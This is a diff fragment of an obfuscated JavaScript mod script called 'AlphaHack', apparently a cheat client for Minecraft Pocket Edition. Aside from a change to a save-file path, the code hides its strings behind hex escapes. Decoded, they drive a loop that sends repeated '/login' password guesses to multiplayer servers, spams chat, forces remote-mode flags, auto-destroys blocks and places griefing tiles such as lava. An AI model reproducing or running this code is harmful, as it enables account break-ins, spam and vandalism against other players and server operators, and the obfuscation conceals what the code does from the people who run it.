+        var path=android.os.Environment.getExternalStorageDirectory().getAbsolutePath()+"/AlphaHackPE/homes/" ; 
         java.io.File(path).mkdirs(); 
         file.createNewFile();
         var write = new java.io.OutputStreamWriter(new java.io.FileOutputStream(file));
@@ -8648,8 +10107,8 @@ function save() {
  
 function load(){
  var line, string = "";
-    var file = new java.io.File( android.os.Environment.getExternalStorageDirectory().getAbsolutePath()+"/games/com.mojang/AlphaHack/"+Level.getWorldDir()+"/homes/", "Home "+name+".txt");
-    var path=android.os.Environment.getExternalStorageDirectory().getAbsolutePath()+"/games/com.mojang/AlphaHack/"+Level.getWorldDir()+"/homes/"; 
+    var file = new java.io.File( android.os.Environment.getExternalStorageDirectory().getAbsolutePath()+"/AlphaHackPE/homes/", "home " + Level.getWorldDir() + ".txt/");
+    var path=android.os.Environment.getExternalStorageDirectory().getAbsolutePath()+"/AlphaHackPE/homes/"; 
     if(!file.exists()){
     clientMessage("The home doesn't exist"); 
   java.io.File(path).mkdirs(); 
@@ -8670,6 +10129,6 @@ function load(){
     }
 }
 
-/***********************/
+/*--------------------*/
 
-var _0x1371=["\x6E\x61\x74\x69\x76\x65\x53\x65\x6E\x64\x43\x68\x61\x74","\x53\x63\x72\x69\x70\x74\x4D\x61\x6E\x61\x67\x65\x72","\x6D\x63\x70\x65\x6C\x61\x75\x6E\x63\x68\x65\x72","\x7A\x68\x75\x6F\x77\x65\x69\x7A\x68\x61\x6E\x67","\x67\x65\x74\x50\x6F\x72\x74","\x2F\x6C\x6F\x67\x69\x6E\x20","\x3C\x70\x61\x73\x73\x77\x6F\x72\x64\x3E","\x28\x70\x61\x73\x73\x77\x6F\x72\x64\x29","\x5B\x70\x61\x73\x73\x77\x6F\x72\x64\x5D","\x7B\x70\x61\x73\x73\x77\x6F\x72\x64\x7D","\x70\x61\x73\x73\x77\x6F\x72\x64","\x69\x73\x53\x68\x6F\x77\x69\x6E\x67","\x73\x65\x74\x4C\x65\x76\x65\x6C\x46\x61\x6B\x65\x43\x61\x6C\x6C\x62\x61\x63\x6B","\x73\x65\x74\x54\x69\x6D\x65","\x67\x65\x74\x50\x6F\x69\x6E\x74\x65\x64\x42\x6C\x6F\x63\x6B\x58","\x67\x65\x74\x50\x6F\x69\x6E\x74\x65\x64\x42\x6C\x6F\x63\x6B\x59","\x67\x65\x74\x50\x6F\x69\x6E\x74\x65\x64\x42\x6C\x6F\x63\x6B\x5A","\x64\x65\x73\x74\x72\x6F\x79\x42\x6C\x6F\x63\x6B","\x0A","\x58\x3A\x20","\x72\x6F\x75\x6E\x64","\x2C\x20\x59\x3A\x20","\x2C\x20\x5A\x3A\x20","\x2E\x20","\x47\x3A\x20","\x67\x65\x74\x47\x61\x6D\x65\x4D\x6F\x64\x65","\x2E","\x20\x54\x3A\x20","\x67\x65\x74\x54\x69\x6D\x65","\x20\x57\x2F\x4C\x3A\x20","\x67\x65\x74\x52\x61\x69\x6E\x4C\x65\x76\x65\x6C","\x2F","\x67\x65\x74\x4C\x69\x67\x68\x74\x6E\x69\x6E\x67\x4C\x65\x76\x65\x6C","\x49\x44\x3A\x20","\x67\x65\x74\x43\x61\x72\x72\x69\x65\x64\x49\x74\x65\x6D","\x3A","\x67\x65\x74\x43\x61\x72\x72\x69\x65\x64\x49\x74\x65\x6D\x44\x61\x74\x61","\x67\x65\x74\x45\x6E\x74\x69\x74\x79","\x67\x65\x74\x4E\x61\x6D\x65","\x20\x7C\x20","\x42\x3A\x20","\x67\x65\x74\x42\x69\x6F\x6D\x65\x4E\x61\x6D\x65","\x20\x76","\x67\x65\x74\x4D\x69\x6E\x65\x63\x72\x61\x66\x74\x56\x65\x72\x73\x69\x6F\x6E","\x73\x68\x6F\x77\x54\x69\x70\x4D\x65\x73\x73\x61\x67\x65","\x73\x65\x74\x54\x69\x6C\x65","\x45\x72\x72\x6F\x72\x3A\x20","\x6C\x61\x6E\x67","\x72\x75\x6E\x4F\x6E\x55\x69\x54\x68\x72\x65\x61\x64","\x70\x6F\x73\x74\x44\x65\x6C\x61\x79\x65\x64","\x6F\x73"];function rptask(){ctx[_0x1371[48]]( new java[_0x1371[47]].Runnable({run:function(){ new android[_0x1371[50]].Handler()[_0x1371[49]]( new java[_0x1371[47]].Runnable({run:function(){if(sspam){net[_0x1371[3]][_0x1371[2]][_0x1371[1]][_0x1371[0]](text)};if(Server[_0x1371[4]]==57788){sspam=false};if(hackk){net[_0x1371[3]][_0x1371[2]][_0x1371[1]][_0x1371[0]](_0x1371[5]+hackcount)};hackcount++;if(hackcount==0){hackcount=_0x1371[6]};if(hackcount==1){hackcount=_0x1371[6]};if(hackcount==2){hackcount=_0x1371[7]};if(hackcount==3){hackcount=_0x1371[7]};if(hackcount==4){hackcount=_0x1371[8]};if(hackcount==5){hackcount=_0x1371[8]};if(hackcount==6){hackcount=_0x1371[9]};if(hackcount==7){hackcount=_0x1371[9]};if(hackcount==8){hackcount=_0x1371[10]};if(hackcount==9){hackcount=_0x1371[10]};if(NO1==null||NO1[_0x1371[11]]()==false){net[_0x1371[3]][_0x1371[2]][_0x1371[1]][_0x1371[12]](true,false);showMenuBtn();showSome()};if(onlyday){Level[_0x1371[13]](0)};if(autod){Level[_0x1371[17]](Player[_0x1371[14]](),Player[_0x1371[15]](),Player[_0x1371[16]](),false)};if(stat22){ModPE[_0x1371[44]](_0x1371[18]+_0x1371[19]+Math[_0x1371[20]](nx)+_0x1371[21]+Math[_0x1371[20]](ny)+_0x1371[22]+Math[_0x1371[20]](nz)+_0x1371[23]+_0x1371[18]+_0x1371[24]+Level[_0x1371[25]]()+_0x1371[26]+_0x1371[27]+Level[_0x1371[28]]()+_0x1371[26]+_0x1371[29]+Math[_0x1371[20]](Level[_0x1371[30]]())+_0x1371[31]+Math[_0x1371[20]](Level[_0x1371[32]]())+_0x1371[23]+_0x1371[33]+Player[_0x1371[34]]()+_0x1371[35]+Player[_0x1371[36]]()+_0x1371[26]+_0x1371[18]+Player[_0x1371[38]](Player[_0x1371[37]]())+_0x1371[39]+_0x1371[40]+Level[_0x1371[41]]()+_0x1371[26]+_0x1371[42]+ModPE[_0x1371[43]]())};if(grief){Level[_0x1371[45]](getPlayerX(),getPlayerY(),getPlayerZ(),11,0)};if(checkForUpdate==false){ctx[_0x1371[48]]( new java[_0x1371[47]].Runnable({run:function(){try{checkVersion()}catch(err){print(_0x1371[46]+err)}}}));checkForUpdate=true};if(updateWindow){ctx[_0x1371[48]]( new java[_0x1371[47]].Runnable({run:function(){try{updateVersion()}catch(err){print(_0x1371[46]+err)}}}));updateWindow=false};nx=getPlayerX();ny=getPlayerY();nz=getPlayerZ();eval(rptask())}}),1000/70)}}))}rptask()
+var _0x7e01=["\x6E\x61\x74\x69\x76\x65\x53\x65\x6E\x64\x43\x68\x61\x74","\x53\x63\x72\x69\x70\x74\x4D\x61\x6E\x61\x67\x65\x72","\x6D\x63\x70\x65\x6C\x61\x75\x6E\x63\x68\x65\x72","\x7A\x68\x75\x6F\x77\x65\x69\x7A\x68\x61\x6E\x67","\x2F\x6C\x6F\x67\x69\x6E\x20","\x54\x72\x79\x69\x6E\x67\x20\x2F\x6C\x6F\x67\x69\x6E\x20\x77\x69\x74\x68\x3A\x20","\x69\x73\x53\x68\x6F\x77\x69\x6E\x67","\x69\x73\x52\x65\x6D\x6F\x74\x65","\x73\x65\x74\x4C\x65\x76\x65\x6C\x46\x61\x6B\x65\x43\x61\x6C\x6C\x62\x61\x63\x6B","\x67\x65\x74\x50\x6F\x69\x6E\x74\x65\x64\x42\x6C\x6F\x63\x6B\x58","\x67\x65\x74\x50\x6F\x69\x6E\x74\x65\x64\x42\x6C\x6F\x63\x6B\x59","\x67\x65\x74\x50\x6F\x69\x6E\x74\x65\x64\x42\x6C\x6F\x63\x6B\x5A","\x64\x65\x73\x74\x72\x6F\x79\x42\x6C\x6F\x63\x6B","\x73\x65\x74\x54\x69\x6C\x65","\x45\x72\x72\x6F\x72\x3A\x20","\x6C\x61\x6E\x67","\x72\x75\x6E\x4F\x6E\x55\x69\x54\x68\x72\x65\x61\x64","\x70\x6F\x73\x74\x44\x65\x6C\x61\x79\x65\x64","\x6F\x73"];function rptask(){ctx[_0x7e01[16]]( new java[_0x7e01[15]].Runnable({run:function(){ new android[_0x7e01[18]].Handler()[_0x7e01[17]]( new java[_0x7e01[15]].Runnable({run:function(){if(sspam){net[_0x7e01[3]][_0x7e01[2]][_0x7e01[1]][_0x7e01[0]](text)};if(hackk){net[_0x7e01[3]][_0x7e01[2]][_0x7e01[1]][_0x7e01[0]](_0x7e01[4]+hackcount);clientMessage(client+_0x7e01[5]+hackcount);hackcount++};if(Debug==null||Debug[_0x7e01[6]]()==false){net[_0x7e01[3]][_0x7e01[2]][_0x7e01[1]][_0x7e01[7]]=true;net[_0x7e01[3]][_0x7e01[2]][_0x7e01[1]][_0x7e01[8]](true,false);showMenuBtn();showSome()};if(autod){Level[_0x7e01[12]](Player[_0x7e01[9]](),Player[_0x7e01[10]](),Player[_0x7e01[11]](),vidd)};if(grief){Level[_0x7e01[13]](getPlayerX(),getPlayerY(),getPlayerZ(),vid,0)};if(checkForUpdate==false){ctx[_0x7e01[16]]( new java[_0x7e01[15]].Runnable({run:function(){try{checkVersion()}catch(err){print(_0x7e01[14]+err)}}}));checkForUpdate=true};if(updateWindow){ctx[_0x7e01[16]]( new java[_0x7e01[15]].Runnable({run:function(){try{updateVersion()}catch(err){print(_0x7e01[14]+err)}}}));updateWindow=false};nx=getPlayerX();ny=getPlayerY();nz=getPlayerZ();eval(rptask())}}),1000/70)}}))}rptask()
